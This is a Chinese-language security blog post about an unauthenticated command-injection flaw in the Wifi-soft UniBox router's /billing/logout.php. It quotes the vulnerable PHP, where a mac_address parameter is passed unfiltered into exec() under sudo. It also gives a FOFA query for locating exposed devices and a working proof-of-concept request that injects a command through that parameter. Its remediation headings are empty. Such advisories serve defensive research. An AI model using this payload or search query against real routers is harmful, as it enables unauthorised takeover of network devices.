---
title: "Unibox路由器 /billing/logout.php 命令执行漏洞"
source: https://mrxn.net/jswz/unibox-billing-logout-mac_address-rce.html
asset_dir: assets/unibox路由器-billinglogout.php-命令执行漏洞
---

# Unibox路由器 /billing/logout.php 命令执行漏洞

[Mrxn](https://mrxn.net/author/1)- 发表于2025/4/29 08:20
- 1464浏览
- [0评论](#comment)
- 20分钟阅读

深入探索

Web安全书籍

数据库

VPN服务

---

# 漏洞简介

Wifi-soft UniBox controller 路由器产品中存在一个致命漏洞，`/billing/logout.php` 受[命令注入](https://mrxn.net/tag/rce)漏洞的影响。未授权的攻击者可通过该漏洞在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个路由器。

# 影响版本

# fofa语法

> `body="Unibox" && body="Controller" || body="www.wifi-soft.com"`

# 漏洞分析

直接看 `/billing/logout.php` 的业务实现造成漏洞的关键部分如下

漏洞修复方案

```
<?php
#==========================================================================================================================# 
# WIFI-SOFT SOLUTIONS PRIVATE LIMITED CONFIDENTIAL
# 
# Copyrights (C) 2005-2011 Wifi-soft Solutions Pvt. Ltd. All Rights Reserved.
# 
# NOTICE:  All information contained herein is, and remains the property of Wifi-soft Solutions Pvt. Ltd. and its suppliers,
# if any.  The intellectual and technical concepts contained herein are proprietary to Wifi-soft Solutions Pvt. Ltd.
# and its suppliers and may be covered by U.S. and international Patents, patents in process, and are protected by 
# trade secret or copyright law.Dissemination of this information or reproduction of this material is strictly forbidden 
# unless prior written permission is obtained from Wifi-soft Solutions Pvt. Ltd.
#
# THIS CODE AND INFORMATION ARE PROVIDED "AS IS" WITHOUT WARRANTY OF ANY 
# KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE
# IMPLIED WARRANTIES OF MERCHANTABILITY AND/OR FITNESS FOR A
# PARTICULAR PURPOSE.
#
# Project: UniBox 
#=========================================================================================================================#
      $logout_user = $_REQUEST['logout_user'];
      $mac_address = $_REQUEST['mac_address'];  

      $status =0 ;  
      if( $logout_user == 1 ){
       exec("sudo /usr/sbin/chilli_ipc logout $mac_address");  
       $status = 1;
    }  
?>
```

很明显的当 `logout_user=` 时，直接将 `mac_address` 拼接进 `exec` 中执行，无任何过滤和校验，造成[命令执行](https://mrxn.net/tag/rce)漏洞。

漏洞修复方案

# 漏洞复现

[漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)利用

> 支持cookie获取参数，注意检测点，别漏

```
GET /billing/logout.php?logout_user=1&mac_address=;id>11.txt HTTP/1.1
Host: unibox.mrxn.net
```

访问命令执行结果文件 `/billing/11.txt`

[![Unibox路由器 /billing/logout.php 命令执行漏洞](images/img-001-eb5d52a50de6.webp)](https://image.mrxn.net/60b4f907ff5143ab9e9755860efa383d.webp)

成功获得 `id` 命令执行的结果

- 标签：
- [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
- [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
- [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
- [#rce](https://mrxn.net/tag/rce)

---

文章目录

- [1.漏洞简介](#toc-1-)
- [2.影响版本](#toc-2-)
- [3.fofa语法](#toc-3-)
- [4.漏洞分析](#toc-4-)
- [5.漏洞复现](#toc-5-)

  
  

![](data:image/png;base64,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)

手机扫码阅读
